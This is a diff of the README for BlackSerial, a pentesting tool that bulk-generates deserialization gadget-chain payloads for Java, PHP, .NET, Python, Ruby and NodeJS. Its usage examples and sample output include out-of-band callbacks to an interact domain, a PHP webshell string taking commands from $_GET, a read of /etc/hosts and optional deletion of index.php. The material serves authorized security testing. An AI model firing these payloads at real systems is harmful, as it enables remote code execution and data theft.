@@ -7,35 +7,76 @@ BlackSerial is a **Blackbox pentesting Gadget Chain Serializer** for:
 * PHP ([PHPGGC](https://github.com/ambionics/phpggc))
 * Python ([Pickle](https://docs.python.org/3/library/pickle.html))
 * C#/.Net ([YSOSerial\.Net](https://github.com/pwntester/ysoserial))
-* Ruby ([GitHubSecurityLab/ruby-unsafe-deserialization](https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/)).
+* Ruby ([GitHubSecurityLab/ruby-unsafe-deserialization](https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/))
+* NodeJS ([deser-node](https://github.com/klezVirus/deser-node))
 
-It is designed to be used during Blackbox pentesting or Bugbounty for 2 use cases:
-* you suspect a deserialisation of user input but you don't have the source code to identify or craft a gadget chain
-* you have a XML, JSON or YAML input and want to detect deserialization
+It is designed to **bruteforce gadget chains** on deserialization endpoints in blackbox or **fuzz XML, JSON or YAML input** to detect deserialization. It prioritizes out of band interact/collaborator dns callback to identify a working chain.
 
-The main objective is to **identify working gadget chains** on a blackbox code base and **which one worked**, not to make the full RCE exploitation. Thus, it prioritizes out of band interact/collaborator dns callback. Then use directly the detected serializer.
-
-It attempts to generate all possible chains, managing the 🤯 burden of the different chains input formats and tools. You may have experienced it if you tried to write a simple bash script to iterate over all the gadget chains supported by the tool. It outputs the results in a file so it can be used directly in Burp Intruder for instance.
-
-BlackSerial is a python wrapper of different tools. It implements or invents no new technique.
+The main objective is to **identify working gadget chains** on a blackbox code base and **which one worked**, not to make the full RCE exploitation.
 
 ## Features
 
-* Generates around 250 gadget chains with default options and all possible formatters
-* Supported serializers: PHPGGC (PHP), YSOSerial (Java), Marshalsec (Java), YSOSerial\.Net (C# .Net), Pickle (Python), Ruby (GitHubSecurityLab/ruby-unsafe-deserialization)
-* Out of band execution detection first with DNS callback to `<chain_id>.<interact_domain>`, like `oj-detection-ruby-3.3.ctj7qmhpf81f7c6r97s0js9ea8i9xkjwp.oast.online`
-* Can generate payloads by formats for any serializer: `-f [xml|json|yaml]`
-* Supported encodings: Base64 `-b`, URL `-u`, Base64 URL safe `-ub`, Hex string `-x`, JSON string `-j`, and any combination like `-b -u`
+* **320 gadget chains** generated with default options and all possible formatters
+* **7 supported serializers**: PHPGGC (PHP), YSOSerial (Java), Marshalsec (Java), YSOSerial\.Net (C# .Net), Pickle (Python), Ruby (GitHubSecurityLab/ruby-unsafe-deserialization), Deser-Node (NodeJS)
+* **Out of band execution detection first** with DNS callback to `<chain_id>.<interact_domain>`, like `oj-detection-ruby-3.3.ctj7qmhpf81f7c6r97s0js9ea8i9xkjwp.oast.online`
+* **Fuzz JSON, XML or YAML** by generating payloads by formats for any language: `-f [xml|json|yaml]`
+* **6 output encodings**: Binary, Base64 `-b`, URL `-u`, Base64 URL safe `-ub`, Hex string `-x`, JSON string `-j`, and any combination like `-b -u`
 * Isolates unsafe gadgets with `--unsafe` option: DoS and file deletion
 * Can generates all payloads in 1 file and remove line feed `\n` of non binary chains (json, yaml, xml) when put in 1 file
 * Can generate 1 file by payload with `-o1` in the format `<chain_name>.txt`. Usefull when you have non binary gadget chains like json, yaml, xml
 * Can generates 1 gadget chain only by its name
 * Phar output support with optional JPEG polyglot
-* Provides 5 custom pickle byte-code (it's not really a chain for pickle, more direct byte-code)
 
 Note: a similar project exists but for ysoserial only and do not work for all payloads: https://github.com/aludermin/ysoserial-wrapper
 
-## Basic examples
+Note2: Burp extension [Freddy](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3) does a similar job for fuzzing XML, JSON or YAML input. Blackserial implements more payloads but contrary to Freddy does not implement ping time-based or error-based detection.
+
+## Basic usage
+
+Typical usage is the following:
+```
+python3 blackserial.py -s [java|php|csharp|python|ruby|nodejs] [-b|-u|-bu|-j] -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com 
+```
+
+For example, generates PHP payloads base64 encoded into `payloads.txt` (default output file) with `nslookup <chain_id>.<domain>` system command (default command):
+```
+python3 blackserial.py -s php -b -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
+
+[+] BlackSerial
+[+] Using serializer phpggc
+[+] Loading available chains
+[+] Loaded 135 chains
+[+] Removing existing payload file payloads.txt
+[+] Interact domain: ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
+[+] System command: nslookup %%chain_id%%.%%domain%%
+[+] PHP Functions: shell_exec
+[+] PHP Code: <?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%
+[+] File read on server: /etc/hosts
+[+] File written on server: ./blackserial.%%ext%%
+[+] Content written on server: <?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%
+[+] Remote file to delete (if unsafe): index.php
+[+] Starting payload generation
+[+] [Bitrix/RCE1] Generating payload of type 'RCE: Function Call'
+[+] [CakePHP/RCE1] Generating payload of type 'RCE: Command'
+[+] [CakePHP/RCE2] Generating payload of type 'RCE: Function Call'
+[+] [CodeIgniter4/FR1] Generating payload of type 'File read'
+[+] [CodeIgniter4/FR1] Generating payload of type 'File read'
+...
+[+] [ZendFramework/RCE5] Generating payload of type 'RCE: Function Call'
+[+] Generated 118 payloads to payloads.txt
+[+] Happy hunting!
+```
+Then use `payloads.txt` in Burp Intruder for example.
+
+Generate all JSON payloads independantly of the technology for blind deserialization detection:
+```
+python3 blackserial.py -s all -f json -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
+```
+
+For manually input XML or JSON payloads in repeater, generates gadgets with 1 file by payload:
+```
+python3 blackserial.py -s csharp -o1 --output ./payloads-dir/ -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
+```
 
 List all supported gadget chains:
 ```
@@ -316,55 +357,6 @@ yaml-rce-ruby-3.3: rce yaml
 [+] Happy hunting!
 ```
 
-Typical usage is the following:
-```
-python3 blackserial.py -s [java|php|csharp|python|ruby] [-b|-u|-bu|-j] -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com 
-```
-
-For example, generates PHP payloads base64 encoded into `payloads.txt` (default output file) with `nslookup <chain_id>.<domain>` system command (default command):
-```
-python3 blackserial.py -s php -b -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
-
-[+] BlackSerial
-[+] Using serializer phpggc
-[+] Loading available chains
-[+] Loaded 135 chains
-[+] Removing existing payload file payloads.txt
-[+] Interact domain: ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
-[+] System command: nslookup %%chain_id%%.%%domain%%
-[+] PHP Functions: shell_exec
-[+] PHP Code: <?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%
-[+] File read on server: /etc/hosts
-[+] File written on server: ./blackserial.%%ext%%
-[+] Content written on server: <?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%
-[+] Remote file to delete (if unsafe): index.php
-[+] Starting payload generation
-[+] [Bitrix/RCE1] Generating payload of type 'RCE: Function Call'
-[+] [CakePHP/RCE1] Generating payload of type 'RCE: Command'
-[+] [CakePHP/RCE2] Generating payload of type 'RCE: Function Call'
-[+] [CodeIgniter4/FR1] Generating payload of type 'File read'
-[+] [CodeIgniter4/FR1] Generating payload of type 'File read'
-...
-[+] [ZendFramework/RCE5] Generating payload of type 'RCE: Function Call'
-[+] Generated 118 payloads to payloads.txt
-[+] Happy hunting!
-
-```
-
-Then use `payloads.txt` in Bupr Intruser for example.
-
-For manually input XML or JSON payloads in repeater, generates gadgets with 1 file by payload:
-```
-python3 blackserial.py -s csharp -o1 --output ./payloads-dir/ -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
-```
-
-Generate all JSON payloads independantly of the technology for blind deserialization detection:
-```
-python3 blackserial.py -s all -f json -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com
-```
-
-⚠️ Do not mistake between `-j` which is just JSON string encoding of a binary output, and `-f json` which is a filter of the gadget which natural output is a JSON payload.
-
 ## Advanced examples
 
 Generates Java payloads base64 encoded with powershell cradle for Windows target:
@@ -392,7 +384,9 @@ Generates only 1 PHP gadget `WordPress/Dompdf/RCE1` with PHP function `exec`:
 python3 blackserial.py -s php -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b --php-function exec WordPress/Dompdf/RCE1
 ```
 
-## Docker install
+## Install
+
+### Docker
 
 Build the docker image (go take a long coffee...):
 ```
@@ -404,145 +398,36 @@ Run it: example:
 docker run -it --rm blackserial:latest -s all -v -i domain.fr
 ```
 
-## Automated local install
+### Exegol / Automated host install
 
-Launch the following script locally. Warning: this will install wine and mono which requires space:
+Launch the following script locally which has also been tested with [Exegol](https://exegol.readthedocs.io/en/latest/) containers. 
+
+⚠️ Warning: this will install wine and mono which requires space:
 ```
 ./install.sh
 ```
 
 Offline installation of dependencies are provided in the `./archives` directory. Git repository are not provided.
 
-## Manual local install
+### Manual host install
 
-### phpggc
-
-Install php:
-```
-sudo apt install php
-```
-
-Clone repository:
-```
-cd bin
-git clone https://github.com/ambionics/phpggc
-```
-
-### ysoserial
-
-Install JRE8 in a local directory:
-```
-cd bin
-wget "https://javadl.oracle.com/webapps/download/AutoDL?BundleId=251398_0d8f12bc927a4e2c9f8568ca567db4ee" -O jre-8u431-linux-x64.tar.gz
-tar -xzf jre-8u431-linux-x64.tar.gz
-```
-
-Download last release from officiel repo: https://github.com/frohoff/ysoserial/releases
-```
-wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
-```
-
-Put `ysoserial-all.jar` in the `bin` directory
-
-
-### marshalsec
-
-Install JRE8 in a local directory (see ysoserial manual install)
-
-Install maven
-
-Clone repository and build it:
-```
-cd bin
-git clone https://github.com/mbechler/marshalsec
-cd marshalsec
-mvn clean package -DskipTests
-```
-
-Test it:
-```
-java -cp target/marshalsec-[VERSION]-SNAPSHOT-all.jar marshalsec.Java
-```
-
-Put `target/marshalsec-[VERSION]-SNAPSHOT-all.jar` in the `bin` directory
-
-### ysoserial
-
-Install JRE8 in a local directory:
-```
-cd bin
-wget "https://javadl.oracle.com/webapps/download/AutoDL?BundleId=251398_0d8f12bc927a4e2c9f8568ca567db4ee" -O jre-8u431-linux-x64.tar.gz
-tar -xzf jre-8u431-linux-x64.tar.gz
-```
-
-Clone repository and build it:
-```
-git clone https://github.com/mbechler/marshalsec
-cd marshalsec
-mvn clean package -DskipTests
-cp ./target/marshalsec-all.jar ../
-```
-
-Test it:
-```
-../bin/jre1.8.0_431/bin/java -cp ./target/marshalsec-all.jar  marshalsec.Java
-```
-
-## pickle
-
-Just install python pickle module:
-```
-pip3 install pickledb
-```
-
-### ysoserial\.net
-
-Under debian linux, use wine:
-```
-sudo apt update 
-sudo dpkg --add-architecture i386
-sudo apt install --install-recommends mono-complete wine winetricks
-winetricks dotnet48
-winetricks nocrashdialog
-```
-
-Download last release from officiel repo: https://github.com/pwntester/ysoserial.net/releases
-
-Unzip it in `bin` directory.
-
-Make a unit test to see if everything is ok:
-```
-wine ./bin/Release/ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 127.0.0.1"
-```
-
-### ruby
-
-Install ruby:
-```
-sudo apt install ruby
-```
-
-Clone repository:
-```
-cd bin
-git clone https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/
-```
+See what is done in `install.sh` script.
 
 ## FAQ / known issues
 
-## Why install another JRE? I have already one installed
+**Why install another JRE? I have already one installed**
 
 Lots of ysoserial payloads need at least JRE 11 and some JRE 8. It is better to download a local JVM to generate them correctly. You can still use your JVM with the option `--java-path`
 
-## Why ysoserial\.net generation is so slow?
+**Why ysoserial\.net generation is so slow?**
 
 Under linux, blackserial uses wine to launch ysoserial.exe and thus it is slow. It may be quicker under Windows.
 
-## Why some ysoserial\.net plugins are not supported?
+**Why some ysoserial\.net plugins are not supported?**
 
 I chose only plugins that are autonomous and do not require extra information. Viewstate plugin requires encryption key for instance and is excluded.
 
-## Some gadgets fail to generate
+**Some gadgets fail to generate**
 
 * ysoserial\.net: ActivitySurrogateDisableTypeCheck
 * ysoserial\.net: PSObject 
@@ -555,7 +440,7 @@ I chose only plugins that are autonomous and do not require extra information. V
 ## TODO
 
 * resx file generation support
-* output format filter: xml, json, yaml, binary
+* integrate https://github.com/klezVirus/deser-node
 
 
 ## ⚠️ WARNING: LEGAL DISCLAIMER
